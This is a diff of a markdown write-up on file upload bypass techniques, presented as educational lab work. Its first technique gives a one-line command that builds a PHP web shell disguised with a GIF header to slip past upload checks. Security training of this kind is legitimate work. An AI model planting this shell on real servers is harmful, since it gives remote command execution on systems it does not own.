@@ -1,9 +1,11 @@
 # File Upload Bypass Techniques - Comprehensive Analysis
 
 ## 🎯 Objective
+
 Demonstrate multiple file upload bypass techniques to execute malicious code despite security controls.
 
 ## 🔍 Common Upload Vulnerabilities
+
 - **File Type Validation:** Incomplete MIME/extension checking
 - **Content Validation:** Insufficient file content analysis
 - **Path Traversal:** Directory traversal in upload paths
@@ -12,7 +14,9 @@ Demonstrate multiple file upload bypass techniques to execute malicious code des
 ## 💥 Exploitation Techniques
 
 ### Technique 1: File Signature Bypass
+
 **Objective:** Upload PHP shell disguised as valid image
+
 ```bash
 # Create PHP shell with GIF header
 echo -e 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.gif.php
@@ -64,3 +68,4 @@ Content Analysis: Differentiating between file headers and actual content
 Defense Layering: Analyzing cumulative security control effectiveness
 
 Conducted in controlled environment for educational purposes
+```
